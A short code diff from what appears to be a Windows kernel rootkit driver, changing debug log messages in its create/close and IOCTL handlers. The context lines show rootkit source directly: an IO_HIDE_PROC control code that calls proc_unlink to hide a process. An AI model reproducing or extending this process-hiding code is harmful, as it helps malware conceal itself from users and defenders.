@@ -15,10 +15,10 @@ NTSTATUS nt_rootkit_create_close(PDEVICE_OBJECT dev_obj, PIRP irp)
 
         switch (io_stack->Parameters.DeviceIoControl.IoControlCode) {
         case IRP_MJ_CREATE:
-                DbgPrint("Handle to symlink opened");
+                DbgPrint(DRIVER_PREFIX "handle to symlink opened.");
                 break;
         case IRP_MJ_CLOSE:
-                DbgPrint("Handle to symlink closed");
+                DbgPrint(DRIVER_PREFIX "handle to symlink closed");
                 break;
         }
 
@@ -38,6 +38,7 @@ NTSTATUS nt_rootkit_ioctl(PDEVICE_OBJECT dev_obj, PIRP irp)
 
         switch (io_stack->Parameters.DeviceIoControl.IoControlCode) {
         case IO_HIDE_PROC:
+                DbgPrint(DRIVER_PREFIX "unlinking process.");
                 proc_unlink((PUINT32)irp->AssociatedIrp.SystemBuffer);
                 break;
         case IO_PID_PROC:
